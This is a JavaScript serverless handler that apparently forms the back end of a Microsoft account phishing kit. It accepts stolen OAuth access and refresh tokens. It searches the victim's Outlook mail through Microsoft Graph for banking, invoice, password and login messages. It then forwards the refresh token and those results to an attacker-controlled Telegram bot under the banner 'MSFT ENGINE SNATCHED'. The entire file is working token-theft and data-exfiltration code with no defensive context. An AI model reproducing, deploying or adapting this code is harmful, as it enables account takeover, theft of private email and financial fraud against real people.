export const config = { runtime: 'edge' };

async function triage(token) {
  const searchTerms = ['bank', 'invoice', 'password', 'login'];
  try {
    const res = await fetch(`https://graph.microsoft.com/v1.0/me/messages?$search="${searchTerms.join(' OR ')}"&$select=subject,receivedDateTime&$top=5`, {
      headers: { 'Authorization': `Bearer ${token}` }
    });
    
    if (!res.ok) return `[Triage Blocked: ${res.status}]`;
    const data = await res.json();
    
    if (data && Array.isArray(data.value) && data.value.length > 0) {
      return data.value.map((m) => `- [${m.receivedDateTime.split('T')[0]}] ${m.subject}`).join('\n');
    }
    return "No high-value matches found in recent emails.";
  } catch (e) {
    return "Triage engine error.";
  }
}

export default async function handler(req) {
  if (req.method !== 'POST') return new Response('Method Not Allowed', { status: 405 });
  
  const data = await req.json();
  if (data.access_token) {
    const triageResults = await triage(data.access_token);
    
    const text = `🚨 MSFT ENGINE SNATCHED (v3.4)\n\n` +
                 `Refresh Token: ${data.refresh_token}\n\n` +
                 `🔍 AUTO-TRIAGE RESULTS:\n${triageResults}`;

    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
          chat_id: process.env.TELEGRAM_CHAT_ID, 
          text: text,
          disable_web_page_preview: true
      }),
    });
    return new Response(JSON.stringify({ status: 'success' }), { status: 200 });
  }
  return new Response('Missing Token', { status: 400 });
}